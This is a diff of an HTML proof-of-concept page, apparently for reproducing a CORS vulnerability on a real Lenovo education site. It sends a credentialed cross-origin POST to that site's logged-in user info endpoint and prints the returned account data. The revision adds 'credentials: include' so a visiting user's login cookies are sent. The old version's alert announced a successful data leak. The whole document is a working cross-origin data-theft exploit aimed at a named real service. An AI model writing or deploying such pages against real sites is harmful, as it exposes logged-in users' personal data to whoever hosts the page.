@@ -1,24 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Lenovo CORS PoC</title>
+  <title>Lenovo 漏洞复现 PoC</title>
 </head>
 <body>
-  <h3>Lenovo 教师信息泄露测试</h3>
+  <h1>测试跨域漏洞</h1>
+  <button id="test">测试请求</button>
+  <pre id="result"></pre>
+
   <script>
-    fetch("https://teacher.educenter.lenovo.com/smartEducation/seuser/loginUserInfo", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: "{}"
-    })
-    .then(res => res.json())
-    .then(data => {
-      console.log("泄露数据：", data);
-      alert("数据泄露成功，请查看控制台！");
-    })
-    .catch(err => console.error("请求失败", err));
+    document.getElementById('test').onclick = function() {
+      fetch("https://teacher.educenter.lenovo.com/smartEducation/seuser/loginUserInfo", {
+        method: "POST",
+        credentials: "include", // 带上登录 Cookie
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: "{}"
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('result').textContent = JSON.stringify(data, null, 2);
+        console.log("返回数据：", data);
+      })
+      .catch(error => {
+        document.getElementById('result').textContent = '请求失败或被拦截：' + error;
+        console.error(error);
+      });
+    };
   </script>
 </body>
 </html>
